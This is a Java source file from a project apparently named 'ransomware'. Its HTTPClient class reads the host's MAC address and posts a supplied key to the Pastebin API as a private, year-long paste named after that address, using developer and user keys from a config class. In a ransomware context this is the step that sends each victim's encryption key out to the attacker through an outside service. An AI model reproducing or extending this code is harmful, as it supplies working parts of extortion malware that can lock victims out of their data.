package ransomware;

import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.Formatter;
import java.util.List;

import org.apache.http.HttpHeaders;
import org.apache.http.NameValuePair;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;

public class HTTPClient {
    private final CloseableHttpClient httpClient = HttpClients.createDefault();

    public HTTPClient() {

    }

    /*
     * public void getKey() throws Exception { HttpGet request = new
     * HttpGet("https://www.google.com/search?q=mkyong");
     * 
     * // add request headers request.addHeader("custom-key", "mkyong");
     * request.addHeader(HttpHeaders.USER_AGENT, "Googlebot");
     * 
     * try (CloseableHttpResponse response = httpClient.execute(request)) {
     * 
     * // Get HttpResponse Status
     * System.out.println(response.getStatusLine().toString());
     * 
     * HttpEntity entity = response.getEntity(); Header headers =
     * entity.getContentType(); System.out.println(headers);
     * 
     * if (entity != null) { // return it as a String String result =
     * EntityUtils.toString(entity); System.out.println(result); }
     * 
     * } }
     */

    public void close() throws Exception {
        httpClient.close();
    }

    public void saveKey(String key) throws Exception {
        HttpPost post = new HttpPost("https://pastebin.com/api/api_post.php");

        InetAddress address = InetAddress.getLocalHost();
        NetworkInterface ni = NetworkInterface.getByInetAddress(address);
        byte[] addr = ni.getHardwareAddress();

        String macAddr = "";
        for (int i = 0; i < addr.length; i++) {
            macAddr += formatString(addr[i]);
            macAddr += ((i < addr.length - 1) ? "-" : "");
        }
        System.out.println(macAddr);

        List<NameValuePair> urlParams = new ArrayList<>();

        // Required
        urlParams.add(new BasicNameValuePair("api_dev_key", Config.DEV_KEY));
        urlParams.add(new BasicNameValuePair("api_option", "paste"));
        urlParams.add(new BasicNameValuePair("api_paste_code", key));
        // urlParams.add(new BasicNameValuePair("api_paste_code", URLEncoder.encode(key,
        // "UTF-8")));

        // Optional
        urlParams.add(new BasicNameValuePair("api_paste_private", "1"));
        urlParams.add(new BasicNameValuePair("api_paste_name", URLEncoder.encode(macAddr, "UTF-8")));
        urlParams.add(new BasicNameValuePair("api_paste_expire_date", "1Y"));
        urlParams.add(new BasicNameValuePair("api_user_key", Config.USER_KEY));

        post.setEntity(new UrlEncodedFormEntity(urlParams));

        try (CloseableHttpClient httpClient = HttpClients.createDefault();
                CloseableHttpResponse response = httpClient.execute(post)) {
            System.out.println(EntityUtils.toString(response.getEntity()));
        }
    }

    public String formatString(Byte args) {
        Formatter formatter = new Formatter();
        String formattedString = formatter.format("%02X", args).toString();
        formatter.close();
        return formattedString;
    }
}